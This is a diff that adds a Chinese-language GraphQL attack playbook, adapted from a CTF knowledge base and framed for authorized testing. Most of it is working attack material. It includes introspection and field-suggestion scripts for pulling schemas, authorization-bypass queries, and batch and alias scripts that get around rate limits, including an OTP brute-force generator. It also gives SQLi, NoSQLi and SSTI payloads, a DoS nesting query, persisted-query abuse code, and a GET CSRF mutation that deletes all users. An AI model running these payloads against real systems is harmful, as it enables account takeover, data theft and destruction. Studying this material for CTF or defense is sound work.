@@ -1,0 +1,542 @@
+# GraphQL 攻击实战
+
+> **来源**：改编自 `LING71671/open-reverselab` 的 `kb/ctf-website/techniques/03-injection/graphql.md`（GPL-3.0）。原 frontmatter 的 `mcp_tools` 映射已剔除——本技能包未挂载 `run_ctf_tool` / `http_probe`，改用本地工具链。
+> **授权范围**：仅限 CTF 靶场 / AWD 赛场 / 已签署授权的测试环境。任何真实第三方目标、真实凭据、真实支付/生产流量都禁止套用本文流程。
+> **什么时候用**：命中「GraphQL / introspection / schema / batch query」这类信号时，把本文当打点清单读；命中即进「步骤」，命中不了就换主题。
+
+## 适用信号
+
+- GraphQL
+- introspection
+- schema
+- batch query
+- alias
+- fragment
+- subscription
+- field suggestion
+
+## 前置
+
+- 授权：目标在 scope 内（`case-init.ps1` 已 grant），测试时段与限速已约定。
+- 工具定位走探测层，别猜路径：
+
+```powershell
+. 'C:\relab2\skillpack\skills\scripts\lib\Bootstrap.ps1'
+$r = Resolve-ReverseToolSpec -Name '<toolid>'   # 例：sqlmap / httpx / ffuf / curl / python
+& $r.Command <参数>                                # 永远用完整路径，不依赖 cwd
+```
+
+- Python 解释器用探测层的 `python`（本机逆向库集中在 `D:\EXE\python\python.exe`，`venv-re` 是空壳，别去那里找库）。
+- 本文脚本默认只读、只打点；扩大范围前先回到 scope 确认。
+- 本文涉及的工具与本机实际状态（探测层 `Resolve-ReverseToolSpec` 于 2026-10-10 实测）：
+
+| 工具 | 本机状态 | 本机命令 / 替代方案 |
+|---|---|---|
+| `playwright` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'playwright').Command ...` → `D:\Tools\Node\playwright.cmd` |
+| `objection` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'objection').Command ...` → `D:\EXE\python\Scripts\objection.exe` |
+| `subfinder` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'subfinder').Command ...` → `D:\Tools\subfinder\subfinder.exe` |
+| `gobuster` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'gobuster').Command ...` → `D:\Tools\gobuster\gobuster.exe` |
+| `mitmdump` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'mitmdump').Command ...` → `D:\EXE\python\Scripts\mitmdump.exe` |
+| `binwalk` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'binwalk').Command ...` → `C:\Users\toti\.cargo\bin\binwalk.exe` |
+| `openssl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'openssl').Command ...` → `C:\Program Files\Git\usr\bin\openssl.exe` |
+| `katana` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'katana').Command ...` → `D:\Tools\katana\katana.exe` |
+| `nuclei` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nuclei').Command ...` → `D:\Tools\nuclei\nuclei.exe` |
+| `python` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'python').Command ...` → `D:\EXE\python\python.exe` |
+| `sqlmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'sqlmap').Command ...` → `D:\Tools\sqlmap\sqlmap.py` |
+| `tshark` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'tshark').Command ...` → `D:\Tools\Wireshark\tshark.exe` |
+| `frida` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'frida').Command ...` → `D:\EXE\python\Scripts\frida.exe` |
+| `httpx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'httpx').Command ...` → `D:\Tools\httpx\httpx.exe` |
+| `naabu` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'naabu').Command ...` → `D:\Tools\naabu\naabu.exe` |
+| `curl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'curl').Command ...` → `C:\WINDOWS\system32\curl.exe` |
+| `dnsx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'dnsx').Command ...` → `D:\Tools\dnsx\dnsx.exe` |
+| `ffuf` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'ffuf').Command ...` → `D:\Tools\ffuf\ffuf.exe` |
+| `nmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nmap').Command ...` → `D:\Tools\nmap\nmap.exe` |
+| `node` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'node').Command ...` → `D:\Tools\Node\node.exe` |
+| `adb` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'adb').Command ...` → `D:\Tools\android\AndroidKiller_fix\bin\adb\adb.exe` |
+| `git` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'git').Command ...` → `C:\Program Files\Git\cmd\git.exe` |
+| `interactsh-client` | 未安装 | OOB 通道需自备回显服务（授权环境内的 VPS + `python -m http.server`）；本机无此工具 |
+| `nuclei-templates` | 随 nuclei 提供 | `nuclei -t <模板目录>`；模板需联网 `-update-templates` |
+
+- 上表中标「未安装」的工具**不要照抄原库的裸命令**：`Get-Command` 查空就下结论是错的，
+  但四级探测 `Available=False` 是结论——此时按替代方案手写脚本，或先装再跑。
+
+
+## 步骤
+
+1. **`PersistedQueryNotFound`** — 带同 hash + 完整 query 再发一次
+2. **`PersistedQueryNotSupported`** — 回普通 POST
+3. **`sha256Hash does not match query`** — 重新按原始 query 字节算
+4. **`data` 正常返回** — 枚举历史 hash 或复用已知 query
+
+## 判据
+
+判据必须是外部可观测的（状态码、响应字段、差分、落盘文件），不是「命令有输出」。
+
+- **响应** — `PersistedQueryNotFound`
+- **响应** — `PersistedQueryNotSupported`
+- **响应** — `sha256Hash does not match query`
+- **响应** — `data` 正常返回
+
+## 坑
+
+- 探针命令在**未本机验证**时不要当成既定事实跑；先用探测层确认 `Available=True`。
+- 噪声排除：先固定 baseline（同 URL 同 token 跑 3 次），再只改一个变量做差分。
+- **12. Variables / Fragment 边界条件** — `Variable "$id" got invalid value`：GraphQL 类型层拦住了，还没进 resolver。
+- **12. Variables / Fragment 边界条件** — `Cannot return null for non-nullable field`：resolver 已执行，但下游数据或权限返回 null。
+- **12. Variables / Fragment 边界条件** — `path` 指向子字段：顶层对象拿到了，问题在字段 resolver。
+- **12. Variables / Fragment 边界条件** — `extensions.code` 为业务错误：已经越过 GraphQL parser，开始打业务逻辑。
+- 不要把「状态码 200」当命中——WAF/缓存/软 404 都返回 200，命中判据要落到具体业务字段。
+
+## 相关
+
+- 见本技能 `../../SKILL.md` 的 references 索引。
+
+## 技术正文
+
+> 以下为原库正文（保留全部技术细节与脚本），仅移除原 `MCP 工具映射` 章节并重写跨文档链接。
+
+## 环境判断
+
+```
+信号:
+- /graphql, /api/graphql, /gql, /query
+- POST body 含 "query" 或 "mutation"
+- 响应含 "data" + "errors" 结构
+- 响应头: Content-Type: application/json
+- 报错含 "__typename" "Cannot query field" "GraphQLError"
+```
+
+## 0. 传输层与解析器差异
+
+GraphQL 不只是一条 `POST /graphql`。同一个 resolver 可能被 JSON body、GET query、batch array、multipart upload、WebSocket subscription、persisted query 多种入口触发，过滤器经常只覆盖其中一种。
+
+| 入口 | 请求形态 | 打点动作 | 命中信号 |
+|---|---|---|---|
+| JSON POST | `{"query":"{__typename}"}` | 基础查询、mutation、variables | `data.__typename` |
+| GET | `/graphql?query={__typename}` | 测 cache、CSRF、URL decode 差异 | GET mutation 被执行 |
+| Batch array | `[{"query":"..."},{"query":"..."}]` | 单请求多 resolver | 返回 JSON 数组 |
+| Alias | `a:user(id:1){...}` | 同 resolver 多次执行 | 同响应里出现多个别名 |
+| Multipart | `operations` + `map` + file part | 文件上传 resolver | `Upload` scalar 或 multipart 错误 |
+| WebSocket | `connection_init` → `subscribe` | subscription / live query | `connection_ack` |
+| APQ | `extensions.persistedQuery` | hash lookup/注册 | `PersistedQueryNotFound` |
+
+先用 `{__typename}` 测入口，再切换 transport；如果 POST 被拦，GET、batch、APQ 经常还能触发同一 resolver。
+
+### 0.1 Schema 到对象/支付/SQL 路由
+
+GraphQL 的价值不只是拖 schema，而是把 type、field、resolver 参数映射成对象图谱。拿到 `Order`, `Payment`, `Invoice`, `User`, `File`, `Coupon` 这类类型后，马上按字段能力分流到 IDOR、BAC、Mass Assignment、SQL/NoSQL 和支付状态机。
+
+| Schema 信号 | 关键字段 | 第一动作 | 下一跳 |
+|---|---|---|---|
+| `User`, `Account`, `Organization` | `id`, `role`, `isAdmin`, `tenantId` | alias 批量查 ID 与 role | IDOR、BAC、字段级 resolver |
+| `Order`, `Cart`, `Checkout` | `orderNo`, `amount`, `status`, `items` | 跨账号/跨状态查询 | 支付逻辑、状态机 |
+| `Payment`, `Invoice`, `Refund` | `transactionId`, `paidAt`, `refundId`, `provider` | 查询支付流水与回调字段 | 回调重放、SQL 账本 |
+| `Coupon`, `GiftCard`, `License` | `code`, `balance`, `downloadUrl`, `secret` | 批量 alias/fragment 拉取 | 数字商品、卡密泄露 |
+| `MutationInput` | `role`, `status`, `amount`, `ownerId` | input 字段注入 | Mass Assignment |
+| `filter`, `where`, `orderBy` | JSON/字符串过滤 DSL | 特殊字符和对象变量 | SQLi/NoSQLi |
+| `Upload`, `File`, `Attachment` | `filename`, `url`, `path`, `contentType` | multipart resolver | 文件上传、LFI、XXE |
+
+Schema 路由器：
+
+```python
+# graphql_schema_router.py
+import json
+import re
+from pathlib import Path
+
+ROUTES = {
+    "payment": re.compile(r"(order|cart|checkout|payment|invoice|refund|transaction|coupon|gift|license)", re.I),
+    "identity": re.compile(r"(user|account|org|tenant|role|admin|permission)", re.I),
+    "database": re.compile(r"(filter|where|orderBy|sort|limit|offset|ids|query)", re.I),
+    "file": re.compile(r"(upload|file|attachment|path|filename|download)", re.I),
+    "secret": re.compile(r"(token|secret|key|signature|webhook|callback)", re.I),
+}
+
+def walk_type(t):
+    for field in t.get("fields") or []:
+        name = f"{t.get('name')}.{field.get('name')}"
+        args = ",".join(a.get("name", "") for a in field.get("args") or [])
+        text = f"{name} {args}"
+        hits = [route for route, rx in ROUTES.items() if rx.search(text)]
+        if hits:
+            yield {"type": t.get("name"), "field": field.get("name"), "args": args, "routes": hits}
+
+def route_schema(schema_json, out="exports/graphql_route_map.json"):
+    data = json.loads(Path(schema_json).read_text(encoding="utf-8"))
+    types = data.get("data", {}).get("__schema", {}).get("types", [])
+    rows = [row for t in types for row in walk_type(t)]
+    Path(out).parent.mkdir(parents=True, exist_ok=True)
+    Path(out).write_text(json.dumps(rows, ensure_ascii=False, indent=2), encoding="utf-8")
+    return rows
+```
+
+执行节奏：
+
+1. 先抓 transport：POST/GET/batch/alias/multipart/WebSocket/APQ 哪些能进 resolver。
+2. 生成 `graphql_route_map.json`，把字段按 `payment/identity/database/file/secret` 分组。
+3. 对 `Order/Payment/Invoice` 类型先跑 alias IDOR，不要只查 `viewer`。
+4. 对 `MutationInput` 先跑字段注入，尤其是 `status/amount/role/ownerId/tenantId`。
+5. 对 `filter/where/orderBy` 用 SQL/NoSQL 语义 payload，观察 GraphQL 类型错误和 DB 错误的边界。
+
+## 1. Introspection 拖 Schema
+
+```graphql
+# 基础 introspection（如果未禁用）
+{
+  __schema {
+    queryType { name fields { name type { name kind } } }
+    mutationType { name fields { name type { name kind } args { name } } }
+    types { name kind fields { name type { name kind ofType { name } } } }
+  }
+}
+
+# 绕过 introspection 禁用 (分段查询)
+{ __typename }
+{ __schema { types { name } } }       # 先拿 type 名称
+{ __type(name: "User") { fields { name type { name } } } }  # 再逐 type 拿字段
+
+# 用别名绕过速率限制/重复字段限制
+query {
+  a: __type(name: "User") { fields { name } }
+  b: __type(name: "Admin") { fields { name } }
+  c: __type(name: "Flag") { fields { name } }
+}
+```
+
+## 2. 字段级授权绕过
+
+```python
+# 拖到 schema 后，直接查不该看到的字段
+# 假设 schema 暴露了 User { id, email, password, role, isAdmin }
+
+MUTATIONS = [
+    # 查管理员
+    'query { users { id email role isAdmin } }',
+    # 查所有用户
+    'query { allUsers { id email password } }',
+    # 查 flag
+    'query { flag }',
+    'query { system { flag } }',
+    'query { config { secretKey } }',
+    # mutation 滥用
+    'mutation { deleteUser(id: 1) { success } }',
+    'mutation { promoteUser(id: 123, role: "admin") { success } }',
+    # 跨类型关联
+    'query { user(id: 1) { posts { comments { author { email } } } } }',
+]
+```
+
+## 3. Batch Query 绕过 Rate Limit
+
+```python
+# 单请求发多条 query，绕过基于请求数的速率限制
+import requests, json
+
+def batch_attack(endpoint: str, queries: list[str]):
+    """将多条 query 打包到同一个 POST body"""
+    # 方式 1: 数组
+    body = [{"query": q} for q in queries]
+    r = requests.post(endpoint, json=body)
+    return r.json()
+
+    # 方式 2: 别名 (aliases) — 同一 query 重复执行
+    aliases = {}
+    for i, q in enumerate(queries):
+        aliases[f"q{i}"] = q
+    # → query q0 { ... } query q1 { ... } ...
+
+# 实战: Bypass OTP bruteforce protection
+otp_queries = [
+    f'mutation {{ verifyOtp(code: "{c:06d}") {{ success }} }}'
+    for c in range(0, 1000000, 1000)
+]
+# 每 1000 条打包一次 send
+```
+
+### A. Alias / Batch 生成器
+
+```python
+import json
+import requests
+
+def alias_query(field: str, ids: list[int], selection="id email role"):
+    body = ["query {"]
+    for i in ids:
+        body.append(f"  u{i}: {field}(id: {json.dumps(str(i))}) {{ {selection} }}")
+    body.append("}")
+    return "\n".join(body)
+
+def send_alias(endpoint, cookie, field="user", start=1, stop=50):
+    q = alias_query(field, list(range(start, stop + 1)))
+    r = requests.post(endpoint, json={"query": q}, headers={"Cookie": cookie})
+    print(r.status_code, r.text[:1000])
+
+def send_batch(endpoint, queries):
+    r = requests.post(endpoint, json=[{"query": q} for q in queries])
+    print(r.status_code)
+    print(r.text[:2000])
+
+send_alias("https://target/graphql", "session=xxx")
+```
+
+判断方式：
+
+- 如果别名全部返回但普通循环触发限制，说明限制绑定在 HTTP request 数。
+- 如果只返回前 N 个别名，说明服务端有 complexity/cost limiter，改用 batch array 或拆字段。
+- 如果 error path 带 `path:["u17","email"]`，可以直接定位哪个 id/字段触发权限差异。
+
+## 4. Alias 滥用
+
+```graphql
+# 同一 mutation 用不同别名多次执行
+mutation {
+    a: createInviteCode { code }
+    b: createInviteCode { code }
+    c: createInviteCode { code }
+}
+# → 一次性生成 3 个邀请码，可能绕过每日限制
+
+# 同一 query 获取不同用户
+query {
+    u1: user(id: 1) { email }
+    u2: user(id: 2) { email }
+    u3: user(id: 3) { email }
+}
+# → 绕过 "每次查询只允许一个用户" 的限制
+```
+
+## 5. Fragment/Inline Fragment 越权
+
+```graphql
+# 利用 inline fragment 试探隐藏类型
+query {
+    node(id: "xxx") {
+        ... on Admin { secretKey }
+        ... on User { email }
+        ... on Flag { value }
+    }
+}
+
+# Union type 利用
+query {
+    search(term: "a") {
+        ... on User { email }
+        ... on Admin { password }   # Admin 可能继承 User
+    }
+}
+```
+
+## 6. 深度递归 DoS (Cost Limit)
+
+```graphql
+# 构造深度嵌套查询耗尽服务端资源
+query {
+    users {
+        posts {
+            comments {
+                author {
+                    posts {
+                        comments {
+                            author {
+                                posts {
+                                    comments { author { id } }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
+```
+
+## 7. 注入类
+
+```python
+# GraphQL 的底层通常是 SQL/NoSQL/ORM
+# 参数位置可能仍然存在注入
+
+# SQLi via GraphQL argument
+# query { user(id: "1 OR 1=1") { email } }
+
+# NoSQLi via GraphQL filter
+# query { users(filter: {email: {"$regex": ".*"}}) { email password } }
+
+# SSTI via GraphQL (如果后端用模板渲染错误信息)
+# query { user(id: "{{7*7}}") { email } }
+```
+
+## 8. Subscription (WebSocket) 攻击
+
+```graphql
+# GraphQL Subscription 走 WebSocket
+subscription {
+    userCreated { id email password }
+}
+# 实时收到新用户数据 — 可能包含不该发的字段
+
+# 探测: 用 wsrepl 连接 /graphql (ws:// 模式)
+# 发送: {"type":"connection_init","payload":{}}
+# 收到: {"type":"connection_ack"}
+# 发送: {"id":"1","type":"start","payload":{"query":"subscription { flagChanged { flag } }"}}
+```
+
+## 9. Persisted Queries 滥用
+
+```graphql
+# 如果服务端注册了持久化查询 (persisted queries)
+# 攻击者可能:
+# 1. 猜测/枚举已知 query hash
+# 2. 发送已注册的 query 但附带额外字段
+
+# 探测
+POST /graphql HTTP/1.1
+{"extensions":{"persistedQuery":{"version":1,"sha256Hash":"<hash>"}}}
+
+# 如果服务端说 "PersistedQueryNotFound" →
+# 可以发送同样的 hash + 完整 query 一起注册
+```
+
+### A. APQ 注册/查找细节
+
+Apollo Persisted Query 常见状态：
+
+| 响应 | 含义 | 下一步 |
+|---|---|---|
+| `PersistedQueryNotFound` | hash 未注册 | 带同 hash + 完整 query 再发一次 |
+| `PersistedQueryNotSupported` | APQ 关闭 | 回普通 POST |
+| `sha256Hash does not match query` | hash 算错或服务端二次规范化 | 重新按原始 query 字节算 |
+| `data` 正常返回 | hash 命中 | 枚举历史 hash 或复用已知 query |
+
+```python
+import hashlib
+import requests
+
+def apq(endpoint, query, variables=None):
+    h = hashlib.sha256(query.encode()).hexdigest()
+    body = {
+        "operationName": None,
+        "variables": variables or {},
+        "extensions": {"persistedQuery": {"version": 1, "sha256Hash": h}},
+    }
+    r1 = requests.post(endpoint, json=body)
+    print("[lookup]", r1.text[:300])
+    body["query"] = query
+    r2 = requests.post(endpoint, json=body)
+    print("[register/execute]", r2.text[:1000])
+
+apq("https://target/graphql", "query { __typename }")
+```
+
+CTF 常见错配：网关按 hash 放行，后端仍执行 body 里的 `query`；或者缓存层只把 hash 作为 key，未把 `variables`、用户身份、租户字段纳入 key。
+
+## 10. Field Suggestions 信息泄露
+
+```bash
+# Apollo Server 默认开启 field suggestions
+# query { user(id: 1) { doesnotexist } }
+# → "Cannot query field 'doesnotexist' on type 'User'. Did you mean 'email' or 'password'?"
+# → 利用这个泄露所有字段名
+
+# 自动提取脚本:
+curl -s 'https://target.com/graphql' -H 'Content-Type: application/json' \
+  -d '{"query":"{ users { doesnotexist } }"}' | jq '.errors[].message'
+```
+
+### A. Suggestion 递归拖字段
+
+```python
+import re
+import requests
+
+SUG = re.compile(r"Did you mean ([^?]+)\\?")
+
+def suggestion_probe(endpoint, typename_path="users", seed="zzzzzz"):
+    q = f"query {{ {typename_path} {{ {seed} }} }}"
+    r = requests.post(endpoint, json={"query": q})
+    msg = " ".join(e.get("message", "") for e in r.json().get("errors", []))
+    m = SUG.search(msg)
+    if not m:
+        print(msg[:500])
+        return []
+    fields = re.findall(r"'([^']+)'", m.group(1))
+    print(typename_path, fields)
+    return fields
+
+for guess in ["id", "email", "password", "secret", "flag", "admin", "token"]:
+    suggestion_probe("https://target/graphql", "user(id:1)", guess + "x")
+```
+
+拿到字段名后不要只查当前类型：继续通过关联字段扩展 `user.posts.author.email`、`team.members.role`、`viewer.organization.secrets`。GraphQL 的越权经常出现在“顶层 resolver 鉴权，子字段 resolver 忘记鉴权”。
+
+## 11. GET 方法 CSRF
+
+```bash
+# 如果 GraphQL 接受 GET:
+curl "https://target.com/graphql?query=mutation+%7B+deleteAllUsers+%7B+success+%7D+%7D"
+# → 可在 <img> 标签中触发，绕过 CORS/CSRF token
+```
+
+## 12. Variables / Fragment 边界条件
+
+```graphql
+# 默认值混淆：服务端只校验 variables，实际 resolver 使用 query default
+query GetUser($id: ID = "1") {
+  user(id: $id) { id email role }
+}
+
+# 类型包装：ID/String/Int 在 resolver 中被 ORM 自动转换
+query {
+  user(id: "0001") { id email }
+  bySlug(slug: ["admin"]) { id }
+}
+
+# Fragment 复用：绕过“字段名出现次数”过滤
+fragment f on User { email role isAdmin }
+query { user(id: 1) { ...f ...f ...f } }
+```
+
+边界判断：
+
+- `Variable "$id" got invalid value`：GraphQL 类型层拦住了，还没进 resolver。
+- `Cannot return null for non-nullable field`：resolver 已执行，但下游数据或权限返回 null。
+- `path` 指向子字段：顶层对象拿到了，问题在字段 resolver。
+- `extensions.code` 为业务错误：已经越过 GraphQL parser，开始打业务逻辑。
+
+---
+
+## 工具链
+
+```bash
+# Graphw00f — 指纹
+python3 graphw00f.py -t https://target.com/graphql
+
+# Clairvoyance — 绕过 introspection 禁用提取 schema
+python3 clairvoyance.py -o schema.json https://target.com/graphql
+
+# GraphQL Cop (Burp) — Schema/批量检查
+# InQL (Burp) — IDE + 攻击
+# CrackQL — 批量爆破/注入
+python3 crackql.py -t https://target.com/graphql -q queries.graphql -w wordlist.txt
+
+# BatchQL — schema 检查 + 批量 query
+# https://batchql.com
+```
+
+## Evidence
+
+记录: introspection/schema JSON、field suggestion 泄露字段名、transport 类型、operationName、variables、batch/alias 数量、subscription 连接消息、APQ hash 与响应、成功字段路径、底层 SQL/NoSQL 报错、订单/支付字段差分和失败样本。
+
+## 13. 攻击链
+
+```
+GraphQL Introspection → 完整 Schema → 发现 admin{flag} → 直接查询
+GraphQL Alias 批量 → 绕过 1 query/min rate limit → 批量数据导出
+GraphQL Batch → 绕过 OTP verify → 暴力破解 → Account Takeover
+GraphQL field suggestion → 逐字段泄露 → 拼出完整数据模型
+GraphQL → NoSQLi in filter → $regex 盲注 → 拖库
+GraphQL Subscription → WebSocket → 实时监听 flag 变化
+GraphQL GET → CSRF → mutation 执行 → 删号/转账
+GraphQL + sqlmap → 底层 SQLi → 读文件 → RCE
+```
